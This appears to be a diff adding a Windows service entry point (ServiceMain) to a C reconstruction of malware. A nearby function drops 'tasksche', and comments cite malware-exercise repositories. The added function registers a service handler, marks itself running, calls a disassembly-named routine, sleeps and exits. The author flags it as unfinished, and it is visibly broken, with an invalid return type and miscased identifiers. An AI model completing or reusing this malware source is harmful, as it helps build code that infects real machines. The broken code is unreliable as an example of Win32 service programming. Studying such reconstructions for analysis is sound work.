@@ -102,6 +102,33 @@ int no_argument_handler()
     drop_tasksche();
 }
 
+//Not finished yet, must be fixed for this to work
+SERVICE_STATUS_HANDLE int ServiceMain(int a, int b)
+{
+	SERVICE_STATUS_HANDLE result;
+	
+	ServiceStatus.dwServiceType = 32;
+	ServiceStatus.dwCurrentState = 2;
+	ServiceStatus.dwControlsaccepted = 1;
+	ServiceStatus.dwWin32ExitCode = 0;
+	ServiceStatus.dwServiceSpecificExitCode = 0;
+	ServiceStatus.dwCheckPoint = 0;
+	ServiceStatus.dwWaitHint = 0;
+
+	result = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);
+	if(result)
+	{
+		ServiceStatus.dwCurrentState = 4;
+		ServiceStatus.dwCheckPoint = 4;
+		Servicestatus.dwWaitHint = 0;
+		SetServicestatus(result, &ServiceStatus);
+		sub_407BD0();
+		Sleep(SOME_NUMBER);
+		ExitProcess(1);
+	}
+	return result;
+}
+
 //https://github.com/jnwilson/MalwareExercises/blob/0994222f90bd7de305ff8115dec053065f8d013f/Chapter%207/ex1.c
 //https://github.com/StefanoBelli/lol/blob/92fd0e349ac42eb71ae9a1302559567cca64c0a1/Win32/ServiceLauncher.c
 //https://github.com/sagishahar/scripts/blob/master/windows_service.c
